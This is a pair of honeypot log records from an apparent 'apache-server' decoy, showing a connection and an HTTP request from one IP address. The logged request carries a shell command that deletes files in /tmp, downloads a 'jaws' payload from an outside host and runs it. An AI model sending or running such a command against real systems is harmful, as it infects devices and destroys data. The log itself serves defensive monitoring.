{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-06T13:35:12.345600","parsedMessage":{"timestamp":"2023-03-06 13:35:12.345600","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 210.113.70.11:33866 to port 80","ip":"210.113.70.11"},"id":"59f8f45b-f4f2-4c70-936c-835d52615526","EventProcessedUtcTime":"2023-03-06T13:35:13.0852328Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T13:35:12.9390000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/210.113.70.11"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Mon Mar  6 13:36:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-06 13:35:12+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"210.113.70.11 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.215.81.11/jaws;chmod+/tmp/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"210.113.70.11"},"id":"7bfb1c1c-0c98-43c1-89fc-a125b165b3af","EventProcessedUtcTime":"2023-03-06T13:36:01.8662122Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T13:36:01.6340000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/210.113.70.11"}